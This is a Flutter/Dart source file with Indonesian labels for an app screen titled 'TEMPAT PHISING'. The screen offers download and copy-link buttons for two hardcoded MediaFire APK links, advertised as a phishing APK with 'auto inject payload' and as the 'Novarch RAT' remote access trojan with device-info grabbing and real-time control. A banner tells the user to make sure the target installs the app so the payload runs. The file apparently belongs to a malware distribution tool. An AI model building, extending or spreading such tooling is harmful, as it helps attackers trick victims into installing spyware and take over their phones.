// tempat_phis.dart
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:url_launcher/url_launcher.dart';

// ═══════════════════════════════════════════════════════════════════════
//  TEMPAT PHIS PAGE — 3D NEOBRUTALISM EDITION
// ═══════════════════════════════════════════════════════════════════════
class TempatPhisPage extends StatefulWidget {
  const TempatPhisPage({super.key});

  @override
  State<TempatPhisPage> createState() => _TempatPhisPageState();
}

class _TempatPhisPageState extends State<TempatPhisPage> {
  // ═══════════════════════════════════════════════════════════════════
  //  ⚙️ KONFIGURASI LINK APK PHISING
  //  Ubah URL di bawah ini sesuai dengan link APK yang ingin dibagikan.
  // ═══════════════════════════════════════════════════════════════════
  final String _linkPhisingXO = "https://www.mediafire.com/file/keih27yc6a6wpxy/app-release_%2528117%2529.apk/file";
  final String _linkPhisingControl = "https://www.mediafire.com/file/4q4ymf9e8bx63db/flutter_1794756062639.apk/file";

  // State loading per tombol
  bool _isLoadingXO = false;
  bool _isLoadingControl = false;

  // ─── PALET NEOBRUTALISM ──────────────────────────────────────────────
  static const Color _bgColor = Color(0xFFFFF3E0); // Krem terang
  static const Color _black = Color(0xFF000000);
  static const Color _white = Color(0xFFFFFFFF);

  // Warna aksen
  static const Color _colorXO = Color(0xFF00D9FF); // Cyan
  static const Color _colorControl = Color(0xFFFF4F78); // Merah Muda
  static const Color _colorCopy = Color(0xFFFFC107); // Kuning untuk tombol salin

  // ═══════════════════════════════════════════════════════════════════
  //  FUNGSI DOWNLOAD APK
  // ═══════════════════════════════════════════════════════════════════
  Future<void> _downloadApk(String url, bool isXO) async {
    HapticFeedback.mediumImpact();

    setState(() {
      if (isXO) {
        _isLoadingXO = true;
      } else {
        _isLoadingControl = true;
      }
    });

    try {
      final uri = Uri.parse(url);
      if (!await launchUrl(uri, mode: LaunchMode.externalApplication)) {
        throw Exception('Could not launch $url');
      }
    } catch (e) {
      if (mounted) {
        _showSnackBar('Gagal membuka link: $e', _colorControl);
      }
    } finally {
      if (mounted) {
        setState(() {
          if (isXO) {
            _isLoadingXO = false;
          } else {
            _isLoadingControl = false;
          }
        });
      }
    }
  }

  // ═══════════════════════════════════════════════════════════════════
  //  FUNGSI SALIN LINK APK
  // ═══════════════════════════════════════════════════════════════════
  Future<void> _copyLink(String url, String label) async {
    HapticFeedback.lightImpact();
    try {
      await Clipboard.setData(ClipboardData(text: url));
      if (mounted) {
        _showSnackBar('✅ Link $label berhasil disalin!', _colorXO);
      }
    } catch (e) {
      if (mounted) {
        _showSnackBar('❌ Gagal menyalin link', _colorControl);
      }
    }
  }

  void _showSnackBar(String message, Color accentColor) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(
          message,
          style: const TextStyle(
            color: _black,
            fontWeight: FontWeight.w800,
            fontFamily: 'Pek',
          ),
        ),
        backgroundColor: accentColor,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(8),
          side: const BorderSide(color: _black, width: 3),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bgColor,
      appBar: AppBar(
        backgroundColor: _colorXO,
        elevation: 0,
        centerTitle: true,
        shape: const Border(
          bottom: BorderSide(color: _black, width: 4),
        ),
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new_rounded, color: _black, size: 22),
          onPressed: () {
            HapticFeedback.lightImpact();
            Navigator.pop(context);
          },
        ),
        title: const Text(
          'TEMPAT PHISING',
          style: TextStyle(
            color: _black,
            fontSize: 18,
            fontWeight: FontWeight.w900,
            letterSpacing: 2,
            fontFamily: 'Pek',
          ),
        ),
      ),
      body: SingleChildScrollView(
        physics: const BouncingScrollPhysics(),
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // ─── HEADER ALERT ───
            _buildAlertBanner(),
            const SizedBox(height: 24),

            // ─── SECTION TITLE ───
            const Text(
              'PILIH APK TARGET',
              style: TextStyle(
                color: _black,
                fontSize: 16,
                fontWeight: FontWeight.w900,
                letterSpacing: 1.5,
                fontFamily: 'Pek',
              ),
            ),
            const SizedBox(height: 12),

            // ─── KARTU 1: X.O PHISING ───
            _buildNeoCard(
              title: 'Phising X.O',
              subtitle: 'APK Phising X.O Novarch',
              icon: Icons.shield_rounded,
              color: _colorXO,
              isLoading: _isLoadingXO,
              apkUrl: _linkPhisingXO,
              onDownload: () => _downloadApk(_linkPhisingXO, true),
              onCopy: () => _copyLink(_linkPhisingXO, 'Phising X.O'),
              features: [
                'Phising Apk For X.O',
                'Auto Inject Payload',
                'Anti Gimmick',
              ],
            ),
            const SizedBox(height: 20),

            // ─── KARTU 2: CONTROL PHISING ───
            _buildNeoCard(
              title: 'Novarch Rat',
              subtitle: 'APK Phising Novarch RAT',
              icon: Icons.developer_board_rounded,
              color: _colorControl,
              isLoading: _isLoadingControl,
              apkUrl: _linkPhisingControl,
              onDownload: () => _downloadApk(_linkPhisingControl, false),
              onCopy: () => _copyLink(_linkPhisingControl, 'Phising Control'),
              features: [
                'Phising Remote Trojan Novarch',
                'Grab Info Perangkat',
                'Real-time Control',
              ],
            ),
            const SizedBox(height: 32),

            // ─── FOOTER ───
            Center(
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                decoration: BoxDecoration(
                  color: _white,
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(color: _black, width: 3),
                  boxShadow: const [
                    BoxShadow(
                      color: _black,
                      offset: Offset(4, 4),
                      blurRadius: 0,
                    ),
                  ],
                ),
                child: const Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Icon(Icons.warning_amber_rounded, color: _black, size: 16),
                    SizedBox(width: 8),
                    Text(
                      'Gunakan dengan bijak!',
                      style: TextStyle(
                        color: _black,
                        fontSize: 11,
                        fontWeight: FontWeight.w700,
                        fontFamily: 'Pek',
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  WIDGET: ALERT BANNER
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildAlertBanner() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: _white,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _black, width: 4),
        boxShadow: const [
          BoxShadow(
            color: _black,
            offset: Offset(6, 6),
            blurRadius: 0,
          ),
        ],
      ),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: _colorControl,
              shape: BoxShape.circle,
              border: Border.all(color: _black, width: 3),
            ),
            child: const Icon(Icons.info_outline_rounded, color: _white, size: 20),
          ),
          const SizedBox(width: 12),
          const Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  'INFORMASI',
                  style: TextStyle(
                    color: _black,
                    fontSize: 14,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 1,
                    fontFamily: 'Pek',
                  ),
                ),
                SizedBox(height: 4),
                Text(
                  'Unduh atau salin link APK phising di bawah ini. Pastikan target sudah terinstal aplikasinya agar payload berjalan sempurna.',
                  style: TextStyle(
                    color: _black,
                    fontSize: 11,
                    fontWeight: FontWeight.w500,
                    height: 1.4,
                    fontFamily: 'Pek',
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  WIDGET: KARTU NEOBRUTALISM (2 TOMBOL)
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildNeoCard({
    required String title,
    required String subtitle,
    required IconData icon,
    required Color color,
    required bool isLoading,
    required String apkUrl,
    required VoidCallback onDownload,
    required VoidCallback onCopy,
    required List<String> features,
  }) {
    return Container(
      decoration: BoxDecoration(
        color: _white,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _black, width: 4),
        boxShadow: const [
          BoxShadow(
            color: _black,
            offset: Offset(8, 8),
            blurRadius: 0,
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          // ─── HEADER KARTU (Warna Aksen) ───
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: color,
              borderRadius: const BorderRadius.vertical(top: Radius.circular(12)),
              border: const Border(bottom: BorderSide(color: _black, width: 4)),
            ),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: _white,
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: _black, width: 3),
                  ),
                  child: Icon(icon, color: _black, size: 26),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        title,
                        style: const TextStyle(
                          color: _black,
                          fontSize: 18,
                          fontWeight: FontWeight.w900,
                          letterSpacing: -0.5,
                          fontFamily: 'Pek',
                        ),
                      ),
                      Text(
                        subtitle,
                        style: const TextStyle(
                          color: _black,
                          fontSize: 11,
                          fontWeight: FontWeight.w600,
                          fontFamily: 'Pek',
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),

          // ─── BODY KARTU ───
          Padding(
            padding: const EdgeInsets.all(16),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Fitur List
                ...features.map((f) => Padding(
                      padding: const EdgeInsets.only(bottom: 6),
                      child: Row(
                        children: [
                          const Icon(Icons.check_circle_rounded, color: _black, size: 16),
                          const SizedBox(width: 8),
                          Expanded(
                            child: Text(
                              f,
                              style: const TextStyle(
                                color: _black,
                                fontSize: 12,
                                fontWeight: FontWeight.w600,
                                fontFamily: 'Pek',
                              ),
                            ),
                          ),
                        ],
                      ),
                    )),

                const SizedBox(height: 16),
                const Divider(color: _black, thickness: 2, height: 1),
                const SizedBox(height: 16),

                // ─── LINK PREVIEW ───
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 8),
                  decoration: BoxDecoration(
                    color: const Color(0xFFF5F5F5),
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(color: _black, width: 2),
                  ),
                  child: Row(
                    children: [
                      const Icon(Icons.link_rounded, color: _black, size: 16),
                      const SizedBox(width: 8),
                      Expanded(
                        child: Text(
                          apkUrl,
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                          style: const TextStyle(
                            color: _black,
                            fontSize: 10,
                            fontWeight: FontWeight.w600,
                            fontFamily: 'Pek',
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 16),

                // ─── 2 TOMBOL BERDAMPINGAN ───
                Row(
                  children: [
                    // Tombol Download
                    Expanded(
                      flex: 3,
                      child: _buildNeoButton(
                        label: 'DOWNLOAD APK',
                        icon: Icons.download_rounded,
                        color: color,
                        isLoading: isLoading,
                        onTap: onDownload,
                      ),
                    ),
                    const SizedBox(width: 10),
                    // Tombol Salin Link
                    Expanded(
                      flex: 2,
                      child: _buildNeoButton(
                        label: 'SALIN',
                        icon: Icons.copy_rounded,
                        color: _colorCopy,
                        isLoading: false,
                        onTap: onCopy,
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  WIDGET: TOMBOL NEOBRUTALISM
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildNeoButton({
    required String label,
    required IconData icon,
    required Color color,
    required bool isLoading,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: isLoading ? null : onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: color,
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: _black, width: 3),
          boxShadow: const [
            BoxShadow(
              color: _black,
              offset: Offset(4, 4),
              blurRadius: 0,
            ),
          ],
        ),
        child: Center(
          child: isLoading
              ? const SizedBox(
                  width: 20,
                  height: 20,
                  child: CircularProgressIndicator(
                    color: _black,
                    strokeWidth: 3,
                  ),
                )
              : Row(
                  mainAxisSize: MainAxisSize.min,
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(icon, color: _black, size: 18),
                    const SizedBox(width: 6),
                    Flexible(
                      child: Text(
                        label,
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                        style: const TextStyle(
                          color: _black,
                          fontSize: 12,
                          fontWeight: FontWeight.w900,
                          letterSpacing: 0.8,
                          fontFamily: 'Pek',
                        ),
                      ),
                    ),
                  ],
                ),
        ),
      ),
    );
  }
}